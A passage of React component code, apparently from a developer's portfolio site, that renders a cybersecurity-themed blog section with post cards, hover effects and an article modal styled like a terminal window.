        className="relative w-full max-w-3xl rounded-2xl border-2 border-red-500 overflow-hidden shadow-2xl shadow-red-500/25
          bg-white dark:bg-gray-950 mb-8"
        onClick={e => e.stopPropagation()}
      >
        {/* Modal terminal header */}
        <div className="sticky top-0 z-10 flex items-center gap-2 px-4 py-3
          bg-gray-100 dark:bg-black border-b border-red-500/30 backdrop-blur-sm">
          <div className="w-2.5 h-2.5 rounded-full bg-red-500" />
          <div className="w-2.5 h-2.5 rounded-full bg-yellow-500" />
          <div className="w-2.5 h-2.5 rounded-full bg-green-500" />
          <span className="ml-2 font-mono text-xs text-gray-500 dark:text-gray-400 truncate flex-1">
            ~/blog/{post.title.toLowerCase().replace(/\s+/g, "-")}.md
          </span>
          <div className="flex items-center gap-3 ml-auto">
            <span className="font-mono text-xs text-red-600 dark:text-red-400 hidden sm:block">{post.readTime}</span>
            <button onClick={onClose} className="text-gray-400 hover:text-red-500 transition-colors">
              <X className="h-4 w-4" />
            </button>
          </div>
        </div>

        {/* Article content */}
        <div className="p-6 sm:p-8 lg:p-10">
          {/* Meta */}
          <div className="flex flex-wrap items-center gap-3 mb-4">
            <div className="flex items-center gap-1.5 px-2 py-1 rounded-md
              bg-red-50 dark:bg-red-500/10 border border-red-200 dark:border-red-500/30">
              <span className="inline-block w-1.5 h-1.5 rounded-full bg-red-500" />
              <span className="font-mono text-xs text-red-600 dark:text-red-400 font-bold">{post.category}</span>
            </div>
            <div className="flex items-center gap-1.5 text-xs text-gray-500 dark:text-muted-foreground">
              <Calendar className="h-3.5 w-3.5" />
              {new Date(post.date).toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" })}
            </div>
            <div className="flex items-center gap-1.5 text-xs text-gray-500 dark:text-muted-foreground">
              <Clock className="h-3.5 w-3.5" />
              {post.readTime}
            </div>
          </div>

          <h1 className="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-900 dark:text-white mb-4 leading-snug">
            {post.title}
          </h1>

          <div className="flex flex-wrap gap-1.5 mb-8 pb-6 border-b border-red-100 dark:border-red-500/10">
            {post.tags.map(tag => (
              <span key={tag} className="font-mono text-xs px-2 py-0.5 rounded
                bg-red-50 dark:bg-red-500/10 border border-red-200 dark:border-red-500/25
                text-red-600 dark:text-red-400">{tag}</span>
            ))}
          </div>

          <div>{renderContent(post.content)}</div>

          {/* Footer */}
          <div className="mt-8 pt-6 border-t border-red-100 dark:border-red-500/10 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <span className="inline-block w-1.5 h-1.5 rounded-full bg-green-500" />
              <span className="font-mono text-xs text-green-600 dark:text-green-400">article.read_complete</span>
            </div>
            <Button size="sm" onClick={onClose}
              className="bg-red-500 hover:bg-red-600 text-white font-mono text-xs">
              Close <X className="ml-1.5 h-3.5 w-3.5" />
            </Button>
          </div>
        </div>
      </motion.div>
    </motion.div>
  );
};

const ScanLine = () => (
  <motion.div
    className="absolute left-0 right-0 h-px bg-red-400/30 dark:bg-red-500/20 pointer-events-none z-10"
    initial={{ top: "0%" }}
    animate={{ top: ["0%", "100%", "0%"] }}
    transition={{ duration: 3.5, repeat: Infinity, ease: "linear" }}
  />
);

// ── Main Blog section ─────────────────────────────────────────────
export const Blog = () => {
  const [activePost, setActivePost] = useState(null);
  const [hoveredId, setHoveredId] = useState(null);

  return (
    <>
      <AnimatePresence>
        {activePost && <ArticleModal post={activePost} onClose={() => setActivePost(null)} />}
      </AnimatePresence>

      <section id="blog" className="py-20 bg-secondary/30 relative overflow-hidden">

        <div className="absolute inset-0 pointer-events-none opacity-[0.04] dark:opacity-[0.03]"
          style={{ backgroundImage: "linear-gradient(rgba(239,68,68,0.8) 1px,transparent 1px),linear-gradient(90deg,rgba(239,68,68,0.8) 1px,transparent 1px)", backgroundSize: "40px 40px" }} />
        <div className="absolute inset-0 pointer-events-none"
          style={{ backgroundImage: "repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.025) 2px,rgba(0,0,0,0.025) 4px)" }} />

        <div className="container mx-auto px-4 sm:px-6 lg:px-8 relative z-10">

          {/* Header */}
          <motion.div initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }} transition={{ duration: 0.6 }} className="text-center mb-14">
            <div className="inline-flex items-center gap-2 bg-white/70 dark:bg-black/40
              border border-red-300 dark:border-red-500/30 rounded-full px-4 py-1.5 mb-5 backdrop-blur-sm">
              <span className="inline-block w-2 h-2 rounded-full bg-red-500 animate-pulse" />
              <span className="font-mono text-xs text-red-600 dark:text-red-400 tracking-widest uppercase">
                blog.feed — {blogPosts.length} posts
              </span>
            </div>
            <h2 className="text-3xl sm:text-4xl lg:text-5xl font-bold mb-4 text-gray-900 dark:text-white">
              Latest <span className="text-red-500 font-mono">[Articles]</span>
            </h2>
            <p className="text-base sm:text-lg text-gray-600 dark:text-muted-foreground max-w-2xl mx-auto">
              Thoughts, insights, and tutorials on web development and cybersecurity
            </p>
          </motion.div>

          {/* Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5 sm:gap-6">
            {blogPosts.map((post, index) => {
              const isHovered = hoveredId === post.id;
              const Icon = post.icon;
              return (
                <motion.div key={post.id}
                  initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }}
                  viewport={{ once: true }} transition={{ duration: 0.5, delay: index * 0.08 }}
                  onMouseEnter={() => setHoveredId(post.id)}
                  onMouseLeave={() => setHoveredId(null)}
                  className="group relative cursor-default"
                >
                  <div className={`
                    relative rounded-xl border overflow-hidden
                    backdrop-blur-sm transition-all duration-300 flex flex-col h-full
                    ${isHovered
                      ? "border-red-500 shadow-lg shadow-red-500/15 dark:shadow-red-500/25 bg-white/90 dark:bg-black/50"
                      : "border-red-200 dark:border-red-500/20 bg-white/70 dark:bg-black/30"}
                  `}>
                    {isHovered && <ScanLine />}

                    <span className="absolute top-2 left-2 font-mono text-xs text-red-300 dark:text-red-500/30 group-hover:text-red-400 dark:group-hover:text-red-500/60 transition-colors z-10">[</span>
                    <span className="absolute top-2 right-2 font-mono text-xs text-red-300 dark:text-red-500/30 group-hover:text-red-400 dark:group-hover:text-red-500/60 transition-colors z-10">]</span>

                    <div className="p-5 sm:p-6 flex flex-col flex-1">
                      {/* Category + date row */}
                      <div className="flex items-center justify-between mb-4">
                        <div className={`flex items-center gap-1.5 px-2 py-1 rounded-md
                          bg-red-50 dark:bg-red-500/10 border border-red-200 dark:border-red-500/30`}>
                          <Icon className="h-3 w-3 text-red-500" />
                          <span className="font-mono text-xs text-red-600 dark:text-red-400 font-bold">{post.category}</span>
                        </div>
                        <div className="flex items-center gap-1.5 text-xs text-gray-500 dark:text-muted-foreground">
                          <Clock className="h-3 w-3" />
                          {post.readTime}
                        </div>
                      </div>

                      {/* Title */}
                      <h3 className={`font-bold text-sm sm:text-base mb-2 leading-snug transition-colors duration-200
                        ${isHovered ? "text-red-600 dark:text-red-400" : "text-gray-900 dark:text-foreground"}`}>
                        {post.title}
                      </h3>

                      {/* Date */}
                      <div className="flex items-center gap-1.5 text-xs text-gray-400 dark:text-muted-foreground mb-3">
                        <Calendar className="h-3 w-3" />
                        {new Date(post.date).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" })}
                      </div>

                      {/* Excerpt */}
                      <p className="text-xs sm:text-sm text-gray-500 dark:text-muted-foreground leading-relaxed mb-4 flex-1 line-clamp-3">
                        {post.excerpt}
                      </p>

                      {/* Tags */}
                      <div className="flex flex-wrap gap-1.5 mb-5">
                        {post.tags.map(tag => (
                          <span key={tag} className="font-mono text-xs px-2 py-0.5 rounded
                            bg-red-50 dark:bg-red-500/10 border border-red-200 dark:border-red-500/25
                            text-red-600 dark:text-red-400">{tag}</span>
                        ))}
                      </div>

                      {/* Read more */}
                      <div className="border-t border-red-100 dark:border-red-500/10 pt-4">
                        <button onClick={() => setActivePost(post)}
                          className="group/btn flex items-center gap-2 font-mono text-xs sm:text-sm text-red-600 dark:text-red-400 hover:text-red-500 transition-colors">
                          <Terminal className="h-3.5 w-3.5" />
                          Read Article
                          <ArrowRight className="h-3.5 w-3.5 group-hover/btn:translate-x-1 transition-transform" />
                        </button>
                      </div>
                    </div>

                    <motion.div className="absolute bottom-0 left-0 right-0 h-px bg-red-500"
                      initial={{ scaleX: 0 }} animate={{ scaleX: isHovered ? 1 : 0 }}
                      transition={{ duration: 0.3 }} />
                  </div>
                </motion.div>
              );
            })}
          </div>

          {/* Footer status */}
          <motion.div initial={{ opacity: 0 }} whileInView={{ opacity: 1 }} viewport={{ once: true }}
            transition={{ delay: 0.4 }}
            className="mt-14 flex flex-wrap items-center justify-center gap-4 sm:gap-8 border-t border-red-200 dark:border-red-500/10 pt-8">
            {[
              { label: "Articles",  value: `${blogPosts.length} published`, dot: "bg-green-500" },
              { label: "Topics",    value: "Dev + Security",               dot: "bg-red-500"   },
              { label: "Updated",   value: "Mar 2025",                     dot: "bg-blue-500"  },
            ].map(item => (
              <div key={item.label} className="flex items-center gap-2">
                <span className={`inline-block w-2 h-2 rounded-full ${item.dot} animate-pulse`} />
                <span className="font-mono text-xs text-gray-500 dark:text-muted-foreground">
                  {item.label}:{" "}
                  <span className="text-gray-900 dark:text-foreground font-bold">{item.value}</span>
                </span>
              </div>
            ))}
          </motion.div>

        </div>
      </section>
    </>
  );
};